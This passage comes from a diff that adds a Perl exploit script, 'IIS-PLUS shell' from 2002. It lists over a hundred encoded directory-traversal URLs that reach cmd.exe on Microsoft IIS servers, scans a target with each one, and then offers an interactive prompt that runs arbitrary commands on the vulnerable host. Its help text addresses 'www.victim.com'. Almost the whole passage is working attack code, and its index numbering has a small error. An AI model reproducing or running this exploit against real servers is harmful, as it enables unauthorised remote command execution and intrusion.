+$U[302] = "/msadc/..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[303] = "/msadc/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+";
+$U[304] = "/msadc/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[305] = "/msadc/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[306] = "/msadc/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[307] = "/msadc/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[308] = "/msadc/..%fc%80%80%80%80%af../..%fc%80%80%80%80%af../..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[309] = "/_mem_bin/..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[310] = "/_mem_bin/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[311] = "/_mem_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+";
+$U[312] = "/_mem_bin/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[313] = "/_mem_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[314] = "/_vti_bin/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[315] = "/msadc/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[316] = "/msadc/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[317] = "/msadc/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[318] = "/msadc/..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[319] = "/msadc/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[320] = "/msadc/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+";
+$U[321] = "/msadc/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[322] = "/msadc/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[323] = "/msadc/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[324] = "/msadc/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt./system32/cmd.exe?/c+";
+$U[325] = "/msadc/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[326] = "/msadc/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[327] = "/msadc/..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[328] = "/msadc/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[329] = "/msadc/..%c1%8s../..%c1%8s../..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[330] = "/msadc/..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[331] = "/msadc/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";
+$U[332] = "/msadc/..%c1%9c../..%c1%9c../..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[333] = "/msadc/..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[334] = "/msadc/..%c1%9c/winnt/system32/cmd.exe?/c+";
+$U[335] = "/msadc/..%c1%af../..%c1%af../..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[336] = "/msadc/..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[337] = "/msadc/..%c1%pc../..%c1%pc../..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[338] = "/msadc/..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[339] = "/msadc/..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[340] = "/msadc/..%f0%80%80%af../..%f0%80%80%af../..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[341] = "/msadc/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[342] = "/msadc/..%f8%80%80%80%af../..%f8%80%80%80%af../..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[343] = "/msadc/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[344] = "/msadc/..%fc%80%80%80%80%af../..%fc%80%80%80%80%af../..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[345] = "/msadc/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[346] = "/msadc/..%u0025%u005c..%u0025%u005cwinnt/system32/cmd.exe?/c+";
+$U[347] = "/msadc/..%u00255c..%u005cwinnt/system32/cmd.exe?/c+";
+$U[348] = "/msadc/..%u002e..%u002e/winnt/system32/cmd.exe?/c+";
+$U[349] = "/msadc/..%u002f..%u002fwinnt/system32/cmd.exe?/c+";
+$U[350] = "/msadc/..%u005c..%u005cwinnt/system32/cmd.exe?/c+";
+$U[351] = "/_mem_bin/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[352] = "/_mem_bin/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[353] = "/_mem_bin/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[354] = "/_mem_bin/..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[355] = "/_mem_bin/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[356] = "/_mem_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?./c+";
+$U[357] = "/_mem_bin/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[358] = "/_mem_bin/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[359] = "/_mem_bin/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[360] = "/_mem_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[361] = "/_mem_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[362] = "/_mem_bin/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[363] = "/_mem_bin/..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[364] = "/_mem_bin/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[365] = "/_mem_bin/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[366] = "/_mem_bin/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[367] = "/_mem_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[368] = "/_mem_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+";
+$U[369] = "/_mem_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[379] = "/_mem_bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[371] = "/_mem_bin/..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[372] = "/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";
+$U[373] = "/_mem_bin/..%255c../winnt/system32/cmd.exe?/c+";
+$U[374] = "/_mem_bin/..%c0%9v../..%c0%9v../..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[375] = "/_mem_bin/..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[376] = "/_mem_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[377] = "/_mem_bin/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+";
+$U[378] = "/_mem_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[379] = "/_mem_bin/..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[380] = "/_mem_bin/..%c0%qf../..%c0%qf../..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[381] = "/_mem_bin/..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[382] = "/_mem_bin/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";
+$U[383] = "/_mem_bin/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[384] = "/_mem_bin/..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[385] = "/_mem_bin/..%c1%8s../..%c1%8s../..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[386] = "/_mem_bin/..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[387] = "/_mem_bin/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";
+$U[388] = "/_mem_bin/..%c1%9c../..%c1%9c../..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[389] = "/_mem_bin/..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[390] = "/_mem_bin/..%c1%9c/winnt/system32/cmd.exe?/c+";
+$U[391] = "/_mem_bin/..%c1%af../..%c1%af../..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[392] = "/_mem_bin/..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[393] = "/_mem_bin/..%c1%pc../..%c1%pc../..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[394] = "/_mem_bin/..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[395] = "/_mem_bin/..%e0%80%af../..%e0%80%af../..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[396] = "/_mem_bin/..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[397] = "/_mem_bin/..%f0%80%80%af../..%f0%80%80%af../..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[398] = "/_mem_bin/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[399] = "/_mem_bin/..%f8%80%80%80%af../..%f8%80%80%80%af../..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[400] = "/_vti_bin/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[401] = "/_vti_bin/..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[402] = "/_vti_bin/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[403] = "/_vti_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+";
+$U[404] = "/_vti_bin/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[405] = "/_vti_bin/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[406] = "/_vti_bin/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[407] = "/_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[408] = "/_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[409] = "/_vti_bin/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[410] = "/_vti_bin/..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[411] = "/_vti_bin/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[412] = "/_vti_bin/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[413] = "/_vti_bin/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[414] = "/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[415] = "/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+";
+$U[416] = "/_vti_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[417] = "/_vti_bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[418] = "/_vti_bin/..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[419] = "/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";
+$U[420] = "/_vti_bin/..%255c../winnt/system32/cmd.exe?/c+";
+$U[421] = "/_vti_bin/..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[422] = "/_vti_bin/..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[423] = "/_vti_bin/..%c0%qf../..%c0%qf../..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[424] = "/_vti_bin/..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[425] = "/_vti_bin/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";
+$U[426] = "/_vti_bin/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[427] = "/_vti_bin/..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[428] = "/_vti_bin/..%c1%8s../..%c1%8s../..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[429] = "/iisadmpwd/cmd.exe?/c+";
+$U[430] = "/iisadmpwd/cmd1.exe?/c+";
+$U[431] = "/iisadmpwd/root.exe?/c+";
+$U[432] = "/iisadmpwd/sensepost.exe?/c+";
+&intro;
+&scan;
+&choose;
+&command;
+&exit;
+sub intro {
+&help;
+&host;
+&server;
+sleep 3;
+};
+sub host {
+print "\nHost or IP : ";
+$host=<STDIN>;
+chomp $host;
+if ($host eq ""){$host="127.0.0.1"};
+print "\nPort (enter to accept 80): ";
+$port=<STDIN>;
+chomp $port;
+if ($port =~/\D/ ){$port="80"};
+if ($port eq "" ) {$port = "80"};
+};
+sub server {
+my $X;
+print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
+print "\nGet IIS string ...";
+$probe = "string";
+my $output;
+my $webserver = "something";
+&connect;
+for ($X=0; $X<=10; $X++){
+        $output = $results[$X];
+        if (defined $output){
+        if ($output =~/IIS/){ $webserver = "iis" };
+        };
+};
+if ($webserver ne "iis"){
+print "\a\a\n\nWARNING : UNABLE TO GET IIS STRING.";
+print "\nThis Server may not be running Micro\$oft IIS WebServer";
+print "\n\n\nContinue anyway? ... [Y/N]";
+my $choice = <STDIN>;
+chomp $choice;
+if ($choice =~/N/i) {&exit};
+            }else{
+print "\n\nOK";
+        };
+};
+sub scan {
+my $status = "not_vulnerable";
+print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
+print "\nScanning $host on port $port ...";
+my $loop;
+my $output;
+my $flag;
+$command="dir";
+for ($loop=1; $loop < @U; $loop++) {
+$flag = "0";
+$url = $U[$loop];
+$probe = "scan";
+&connect;
+foreach $output (@results){
+if ($output =~ /Directory/) {
+                              $flag = "1";
+                              $status = "vulnerable";
+                              };
+        };
+if ($flag eq "0") {
+print "\nNo URL $loop...";
+}else{
+print "\a\a\a\n$host VULNERABLE TO URL $loop !!!";
+     };
+};
+if ($status eq "not_vulnerable"){
+                                print "\n\n
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+SORRY $host is NOT Vulnerable to this Exploit.";
+                                &exit;
+                                };
+};
+sub choose {
+print "\nSelect a URL (type 0 to input)";
+my $choice=<STDIN>;
+chomp $choice;
+if ($choice > @U){ &choose };
+if ($choice =~/\D/g ){ &choose };
+if ($choice == 0){ &other };
+$url = $U[$choice];
+print "\nURL: HTTP://$host$url";
+};
+sub other {
+print "\nURL [minus command] eg: HTTP://$host\/scripts\/cmd.exe?\/+";
+print "\nHTTP://$host";
+my $other = <STDIN>;
+chomp $other;
+$U[0] = $other;
+};
+sub command {
+while ($command !~/quit/i) {
+print "\nHELP QUIT URL SCAN Or Command eg dir C: ";
+print "\nCommand :";
+$command = <STDIN>;
+chomp $command;
+if ($command =~/quit/i) { &exit };
+if ($command =~/url/i) { &choose };
+if ($command =~/scan/i) { &scan };
+if ($command =~/help/i) { &help };
+$command =~ s/\s/+/g;
+print "HTTP://$host$url$command";
+$probe = "command";
+if ($command !~/quit|url|scan|help/) {&connect};
+};
+&exit;
+};
+sub connect {
+my $connection = IO::Socket::INET->new (
+                                Proto => "tcp",
+                                PeerAddr => "$host",
+                                PeerPort => "$port",
+                                ) or die "\nSorry UNABLE TO CONNECT To $host On Port $port.\n";
+$connection -> autoflush(1);
+if ($probe =~/command|scan/){
+print $connection "GET $url$command$shiz HTTP/1.1\r\nHost: $host\r\n\r\n";
+}elsif ($probe =~/string/) {
+print $connection "HEAD / HTTP/1.1\r\nHost: $host\r\n\r\n";
+};
+
+while ( <$connection> ) {
+                        @results = <$connection>;
+                         };
+close $connection;
+if ($probe eq "command"){ &output };
+if ($probe eq "string"){ &output };
+};
+sub output{
+print "\nOUTPUT FROM $host. \n\n";
+my $display;
+if ($probe eq "string") {
+                        my $X;
+                        for ($X=0; $X<=10; $X++) {
+                        $display = $results[$X];
+                        if (defined $display){print "$display";};
+                        sleep 1;
+                                };
+                        }else{
+                        foreach $display (@results){
+                            print "$display";
+                            sleep 1;
+                                };
+                          };
+};
+sub exit{
+print "\n\n\n
+
+
+
+ANDREA SPABAM 2002.";
+print "\nspabam.da.ru spabam\@go.to";
+print "\n\n\n";
+exit;
+};
+sub help {
+print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
+print "\n
+
+        IIS-PLUS shell v 3.7 by SPABAM. 2002. spabam\@yahoo.com";
+print "\n
+
+http://www.securityfocus.com/bid/1806/exploit/
+";
+print "\n A IIS HTTP exploit for Micro\$oft WebServers using 450 URL.";
+print "\n
+note.. web directory is normally c:\\Inetpub\\wwwroot";
+print "\n";
+print "\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)";
+print "\n port: 80 (normally) or other (like https) (RETURN for 80)";
+print "\n Command: SCAN URL HELP QUIT";
+print "\n\n\n";
